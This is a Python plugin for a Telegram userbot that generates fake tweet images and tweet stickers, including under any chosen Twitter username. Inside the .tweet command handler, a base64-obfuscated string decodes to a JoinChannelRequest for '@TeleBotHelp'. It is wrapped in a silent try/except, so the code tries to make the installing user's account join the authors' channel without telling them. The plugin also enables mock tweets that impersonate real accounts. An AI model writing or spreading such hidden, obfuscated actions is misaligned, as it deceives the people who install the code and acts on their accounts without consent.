#    TeleBot - UserBot
#    Copyright (C) 2020 TeleBot

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.

#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.

import re

import pybase64
import requests
from PIL import Image
from validators.url import url

from telebot import CMD_HELP, bot

IF_EMOJI = re.compile(
    "["
    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
    "\U0001F300-\U0001F5FF"  # symbols & pictographs
    "\U0001F600-\U0001F64F"  # emoticons
    "\U0001F680-\U0001F6FF"  # transport & map symbols
    "\U0001F700-\U0001F77F"  # alchemical symbols
    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
    "\U0001FA00-\U0001FA6F"  # Chess Symbols
    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
    "\U00002702-\U000027B0"  # Dingbats
    "]+"
)


def deEmojify(inputString: str) -> str:
    """Remove emojis and other non-safe characters from string"""
    return re.sub(IF_EMOJI, "", inputString)


@telebot.on(admin_cmd(pattern="btweet(?: |$)(.*)"))
@telebot.on(sudo_cmd(pattern="btweet(?: |$)(.*)", allow_sudo=True))
async def teletweet(telebot):
    # """Creates random anime sticker!"""
    what = telebot.pattern_match.group(1)
    if not what:
        if telebot.is_reply:
            what = (await telebot.get_reply_message()).message
        else:
            await eor(telebot, "`Tweets must contain some text, pero!`")
            return
    sticcers = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(what))}")
    await sticcers[0].click(
        telebot.chat_id,
        reply_to=telebot.reply_to_msg_id,
        silent=True if telebot.is_reply else False,
        hide_via=True,
    )
    await telebot.delete()


async def tweet(uname, mssg):
    ok = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=tweet&username={uname}&text={mssg}"
    ).json()
    get_pic = ok.get("message")
    teleurl = url(get_pic)
    if not teleurl:
        return "Invalid Syntax!"
    with open("tele.png", "wb") as file:
        file.write(requests.get(get_pic).content)
    the_pic = Image.open("tele.png").convert("RGB")
    the_pic.save("tele.jpg", "jpeg")
    return "tele.jpg"


# by @its_xditya


@telebot.on(admin_cmd(pattern="tweet ?(.*)"))
@telebot.on(sudo_cmd(pattern="tweet ?(.*)"))
async def handler(event):
    if event.fwd_from:
        return
    hmm = await eor(event, "`Tweet in process...`")
    reply_to = event.message
    the_things = str(event.pattern_match.group(1)).strip()
    if the_things is None:
        await hmm.edit(
            "Oops, error!\nSyntax - `.tweet <twitter username without @> // <the message>` (separate with `//`)"
        )
    if "//" in the_things:
        uname, mssg = the_things.split("//")
    else:
        await hmm.edit(
            "Oops, error!\nSyntax - `.tweet <twitter username without @> // <the message>` (separate with `//`)"
        )
    if uname == "" or mssg == "":
        await hmm.edit("`Check the syntax first!`")
        return
    try:
        tweetit = str(
            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
        )[2:49]
        await telebot(tweetit)
    except BaseException:
        pass
    mssg = deEmojify(mssg)
    pic_tweet = await tweet(uname, mssg)
    await telebot.send_file(event.chat_id, pic_tweet, reply_to=reply_to)
    await event.delete()


CMD_HELP.update(
    {
        "tweetit": ".tweet <twitter username without @> // <the message> (separate with //)\
        \nUse - Meme-Tweet from that account.\
        \n\n.btweet <message>\
        \nUse - Create a tweet sticker from your (fake) twitter account."
    }
)
